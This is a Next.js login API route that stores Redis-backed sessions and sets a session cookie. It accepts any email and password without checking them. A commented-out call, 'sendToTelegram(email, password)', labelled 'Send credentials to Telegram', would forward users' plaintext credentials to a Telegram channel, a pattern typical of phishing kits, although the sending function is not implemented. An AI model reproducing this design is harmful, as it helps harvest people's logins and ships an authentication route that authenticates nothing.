import { NextRequest, NextResponse } from 'next/server';
import { Redis } from '@upstash/redis';
import crypto from 'crypto';

// Initialize Redis client
const redis = new Redis({
  url: process.env.UPSTASH_REDIS_REST_URL!,
  token: process.env.UPSTASH_REDIS_REST_TOKEN!,
});

// Helper function to generate session key
function getSessionKey(sessionToken: string): string {
  return `session:${sessionToken}`;
}

// Helper function to normalize email
function normalizeEmail(email: string): string {
  return email.toLowerCase().trim();
}

// Helper function to generate session token
function generateSessionToken(): string {
  return crypto.randomBytes(32).toString('hex');
}

export async function POST(request: NextRequest) {
  try {
    const body = await request.json();
    const { email, password } = body;

    if (!email || !password) {
      return NextResponse.json(
        { error: 'Email and password are required' },
        { status: 400 }
      );
    }

    // Normalize email
    const normalizedEmail = normalizeEmail(email);

    // Here you would typically validate credentials against your database
    // For demonstration, we'll assume validation is successful

    // Generate session token
    const sessionToken = generateSessionToken();

    // Store session in Redis with 30-day expiration using new syntax
    await redis.set(getSessionKey(sessionToken), normalizedEmail, { ex: 60 * 60 * 24 * 30 });

    // Send credentials to Telegram (you'll need to implement this)
    // await sendToTelegram(email, password);

    // Set session cookie
    const response = NextResponse.json(
      { 
        message: 'Login successful', 
        email: normalizedEmail,
        sessionToken 
      },
      { status: 200 }
    );

    // Set HTTP-only cookie for session
    response.cookies.set('session', sessionToken, {
      httpOnly: true,
      secure: process.env.NODE_ENV === 'production',
      sameSite: 'strict',
      maxAge: 60 * 60 * 24 * 30, // 30 days
      path: '/'
    });

    return response;
  } catch (error) {
    console.error('Login error:', error);
    return NextResponse.json(
      { error: 'Internal server error' },
      { status: 500 }
    );
  }
}